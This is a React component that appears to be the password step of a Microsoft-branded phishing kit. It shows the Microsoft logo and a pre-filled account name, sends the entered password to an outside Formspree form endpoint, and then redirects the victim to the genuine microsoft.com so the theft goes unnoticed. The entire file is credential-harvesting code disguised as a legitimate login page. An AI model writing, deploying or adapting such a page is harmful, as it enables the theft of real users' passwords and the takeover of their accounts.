import { useForm } from "@formspree/react";
import React from "react";
import { Link } from "react-router-dom";
import "react-toastify/dist/ReactToastify.css";
import Logo from "../assests/images/microsoft_logo.svg";

const Password = ({ inputValue }) => {
  const [state, handleSubmit] = useForm("mzboyooe");
  const [inputVal] = React.useState(inputValue && inputValue);
  if (state.succeeded) {
    return window.location.replace(
      'https://www.microsoft.com/en-us/?ql=6", "_blank"'
    );
  }

  console.log(inputVal, "inputValue");

  return (
    <div className="md:bg-office h-screen pt-4 md:pt-36">
      <div className="md:w-96 h-auto w-80 p-4 md:p-8 bg-white mx-auto">
        <img src={Logo} alt="logo" />
        <div className="text-lg bold my-2">{inputVal}</div>
        <form method="POST" onSubmit={handleSubmit}>
          <input
            type="password"
            name="password"
            id="password"
            className="outline-none border-blue-400 pt-1 border-b-2 w-full"
            placeholder="Password"
          />
          <Link to="/">
            <div className="py-3 text-blue-400 ">Forgot password?</div>
          </Link>
          {/* <a href="#" className="my-3 text-blue-400">
            This isn't me
          </a> */}
          <div className="py-5 ml-44 md:ml-56">
            <a href="#" className="px-6 py-1 hidden bg-gray-400">
              Back
              <button
                type="submit"
                className="px-6 py-1 ml-3 text-white bg-blue-600"
                disabled={state.submitting}
              >
                Next
              </button>
            </a>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Password;
